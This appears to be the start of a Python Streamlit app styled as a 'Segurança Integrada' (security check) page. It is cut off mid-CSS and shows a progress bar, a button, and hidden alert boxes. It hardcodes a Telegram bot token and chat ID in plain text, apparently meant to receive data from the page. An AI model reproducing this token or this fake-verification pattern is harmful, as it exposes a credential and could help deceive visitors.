import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Integrada", layout="centered")

# --- CSS ORIGINAL MIAMY ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; }
    .status-container { font-size: 22px; margin: 15px 0; color: #e0e0e0; min-height: 30px; }
    .progress-bg { width: 100%; height: 8px; background-color: #1e262e; border-radius: 10px; margin-bottom: 40px; overflow: hidden; }
    .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white; color: black; width: 300px; height: 85px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction
        
